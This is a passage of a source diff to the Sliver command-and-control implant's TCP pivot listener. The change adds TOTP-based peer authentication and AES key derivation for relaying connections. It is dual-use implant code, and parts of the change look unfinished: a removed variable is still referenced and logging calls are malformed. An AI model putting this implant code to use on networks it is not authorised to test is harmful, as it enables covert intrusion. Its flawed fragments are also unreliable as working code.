@@ -20,12 +20,18 @@ package pivots
 
 import (
 	// {{if .Config.Debug}}
+
+	"encoding/binary"
+	"fmt"
 	"log"
-	// {{end}}
-	"math/rand"
-	"net"
+	"sync"
 	"time"
 
+	// {{end}}
+
+	"net"
+
+	"github.com/bishopfox/sliver/implant/sliver/cryptography"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 
@@ -48,38 +54,61 @@ func StartTCPListener(address string) error {
 		Type:          "tcp",
 		RemoteAddress: address,
 	})
-	go tcpPivotAcceptNewConnection(&ln)
+	go tcpPivotAcceptNewConnection(ln)
 	return nil
 }
 
-func tcpPivotAcceptNewConnection(ln *net.Listener) {
-
+func tcpPivotAcceptNewConnection(ln net.Listener) {
 	for {
-		conn, err := (*ln).Accept()
+		conn, err := ln.Accept()
 		if err != nil {
+			// {{if .Config.Debug}}
+			log.Println("TCP accept failure: %s", err)
+			// {{end}}
 			continue
 		}
-		rand.Seed(time.Now().UnixNano())
-		pivotID := rand.Uint32()
-		pivotsMap.AddPivot(pivotID, &conn, "tcp", conn.LocalAddr().String())
-		//SendPivotOpen(pivotID, "tcp", conn.LocalAddr().String(), transports.GetActiveConnection())
-
-		// {{if .Config.Debug}}
-		log.Println("Accepted a new connection")
-		// {{end}}
-
 		// handle connection like any other net.Conn
-		go tcpPivotConnectionHandler(&conn, pivotID)
+		go tcpPivotConnectionHandler(conn)
 	}
 }
 
-func tcpPivotConnectionHandler(conn *net.Conn, pivotID uint32) {
+func tcpPivotConnectionHandler(conn net.Conn) {
+	// First we read a uint64 containing the current OTP
+	// code to prevent random connections and confirm the
+	// peer was compiled by the same server.
+	otpBuf := make([]byte, 8)
+	conn.SetReadDeadline(time.Now().Add(time.Second * 10))
+	n, err := conn.Read(otpBuf)
+	if err != nil || n != 8 {
+		conn.Close()
+		// {{if .Config.Debug}}
+		log.Println("Failed to read otp code from peer: %v", err)
+		// {{end}}
+		return
+	}
+	otpCode := fmt.Sprintf("%d", binary.LittleEndian.Uint64(otpBuf))
+	valid, err := cryptography.ValidateTOTP(otpCode)
+	if err != nil || !valid {
+		conn.Close()
+		// {{if .Config.Debug}}
+		log.Println("Invalid otp code from peer %v", err)
+		// {{end}}
+		return
+	}
+	cipherCtx := &cryptography.CipherContext{
+		Key:    cryptography.PeerAESKey(otpCode),
+		replay: &sync.Map{},
+	}
+	tcpPivotStart(cipherCtx, conn)
+}
+
+func tcpPivotStart(cipherCtx *cryptography.CipherContext, conn net.Conn) {
 
 	defer func() {
 		// {{if .Config.Debug}}
 		log.Printf("Cleaning up for pivot %d\n", pivotID)
 		// {{end}}
-		(*conn).Close()
+		conn.Close()
 		pivotClose := &sliverpb.PivotClose{
 			PivotID: pivotID,
 		}
